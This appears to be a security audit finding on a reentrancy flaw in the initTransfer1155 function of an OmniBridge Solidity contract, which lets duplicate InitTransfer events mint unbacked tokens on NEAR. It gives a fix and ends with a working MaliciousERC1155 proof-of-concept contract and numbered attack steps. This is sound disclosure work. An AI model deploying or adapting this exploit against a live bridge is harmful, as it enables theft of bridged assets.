### Title
CEI Violation in `initTransfer1155` Enables Reentrancy to Emit Duplicate `InitTransfer` Events Without Corresponding Token Locks — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` in `OmniBridge.sol` makes an external call to an attacker-controlled ERC1155 token contract (`safeTransferFrom`) before emitting the `InitTransfer` event, with no reentrancy guard. A malicious ERC1155 token can reenter `initTransfer1155` during `safeTransferFrom`, causing multiple `InitTransfer` events to be emitted with distinct nonces while locking zero or fewer tokens than credited. The NEAR side treats each event as an independent, valid transfer and mints bridged tokens for each, enabling unauthorized token creation.

---

### Finding Description

In `initTransfer1155`, the execution order is:

1. `currentOriginNonce += 1` (line 448) — state effect
2. `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458) — **external call to attacker-controlled contract**
3. `initTransferExtension(...)` (line 468)
4. `emit BridgeTypes.InitTransfer(...)` (line 480) [1](#0-0) 

The function has no `nonReentrant` modifier. The `safeTransferFrom` target is the caller-supplied `tokenAddress`, which is fully attacker-controlled — there is no whitelist check on which ERC1155 tokens may be used with `initTransfer1155`.

The bridge's `onERC1155Received` hook (lines 522–535) checks `operator != address(this)` and reverts if not. During `initTransfer1155`, the bridge itself is the operator (it called `safeTransferFrom`), so this check passes and does **not** block reentrancy. [2](#0-1) 

A malicious ERC1155 token's `safeTransferFrom` implementation can, before or after calling `onERC1155Received`, call back into `initTransfer1155` on the bridge. The reentrant call increments `currentOriginNonce` to `N+1` and emits a second `InitTransfer` event. The outer call then continues and emits a first `InitTransfer` event with nonce `N`. Both events carry the same `amount` and `recipient`. The malicious token may transfer zero actual tokens in either or both legs.

The NEAR bridge's `fin_transfer_callback` → `process_fin_transfer_to_near` → `add_fin_transfer` deduplicates by `(origin_chain, origin_nonce)`: [3](#0-2) 

Since the two events carry **different** nonces (`N` and `N+1`), both pass the uniqueness check and are independently finalized. The NEAR side mints bridged tokens for each event.

---

### Impact Explanation

**Critical.** An attacker can emit two (or more) `InitTransfer` events for a registered ERC1155 token while locking zero tokens on the EVM side. The NEAR bridge mints bridged tokens for each event independently, because each carries a unique `origin_nonce`. This constitutes unauthorized minting and escrow mis-accounting: the NEAR-side token supply grows without a corresponding EVM-side lock, breaking the 1:1 peg and allowing the attacker to redeem bridged tokens for real assets on other chains.

---

### Likelihood Explanation

**Medium.** The attack requires two permissionless steps before exploitation:

1. **Deploy a malicious ERC1155 token** — no permission needed.
2. **Register it on NEAR** — call `logMetadata1155` (permissionless, emits `LogMetadata`) and then `deploy_token` on NEAR with the resulting proof. The light-client or MPC prover processes any valid `LogMetadata` event from the registered EVM factory; no admin approval is required. [4](#0-3) 

Once the token is registered, the exploit is a single transaction. No privileged access, leaked keys, or validator collusion is required.

---

### Recommendation

Apply the Checks-Effects-Interactions pattern strictly in `initTransfer1155`:

1. **Add a `nonReentrant` modifier** (OpenZeppelin `ReentrancyGuard`) to `initTransfer1155` (and `initTransfer` for consistency).
2. Alternatively, **emit the event and update all state before the external call**, then verify post-call that the bridge's ERC1155 balance increased by the expected amount.

The documented security invariant already states *"State before external calls: Always mutate state (e.g. mark nonce used) before any external call"*; `initTransfer1155` violates this because the `InitTransfer` event (which the NEAR side treats as authoritative proof of a lock) is emitted **after** the external call, inside a reentrant execution window. [5](#0-4)

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    bool public reentered;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by bridge's initTransfer1155 via safeTransferFrom
    function safeTransferFrom(
        address, address, uint256 tokenId, uint256 amount, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reenter initTransfer1155 — increments nonce to N+1, emits InitTransfer(N+1)
            bridge.initTransfer1155(address(this), tokenId, uint128(amount), 0, 0, "attacker.near", "");
        }
        // Transfer 0 tokens — bridge balance unchanged
        // Call onERC1155Received: operator == bridge, check passes
        IERC1155Receiver(msg.sender).onERC1155Received(
            address(bridge), address(this), tokenId, amount, ""
        );
    }

    // Minimal ERC1155 stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridge)
// 2. logMetadata1155(maliciousToken, tokenId) → emit LogMetadata
// 3. Wait for NEAR to process LogMetadata and register token via deploy_token
// 4. Call bridge.initTransfer1155(maliciousToken, tokenId, X, 0, 0, "attacker.near", "")
//    → emits InitTransfer(nonce=N,   amount=X) — 0 tokens locked
//    → emits InitTransfer(nonce=N+1, amount=X) — 0 tokens locked
// 5. NEAR mints 2X bridged tokens to attacker.near
